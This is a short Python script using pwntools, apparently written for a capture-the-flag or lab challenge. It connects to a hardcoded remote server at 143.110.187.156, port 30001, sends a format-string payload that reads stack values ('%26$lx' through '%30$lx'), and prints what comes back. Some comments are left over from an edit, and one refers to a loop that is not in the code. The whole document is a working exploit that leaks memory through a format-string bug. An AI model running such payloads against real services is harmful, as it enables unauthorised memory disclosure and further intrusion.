from pwn import *

# Set up the server details
server_address = '143.110.187.156'  # Change to your server's address
server_port = 30001             # Change to your server's port

# Define the payloads to be sen

# Iterate through the payloads

    # Connect to the server
payload = "%26$lx%27$lx.%28$lx.%29$lx.%30$lx"
payload = payload.encode()
conn = remote(server_address, server_port)

# Send the payload
conn.sendline(payload)

# Receive and print the response
response = conn.recvall()  # Change to conn.recv() if you expect a specific size
print(f'Response for payload "{payload.decode()}": {response.decode()}')

# Close the connection
conn.close()
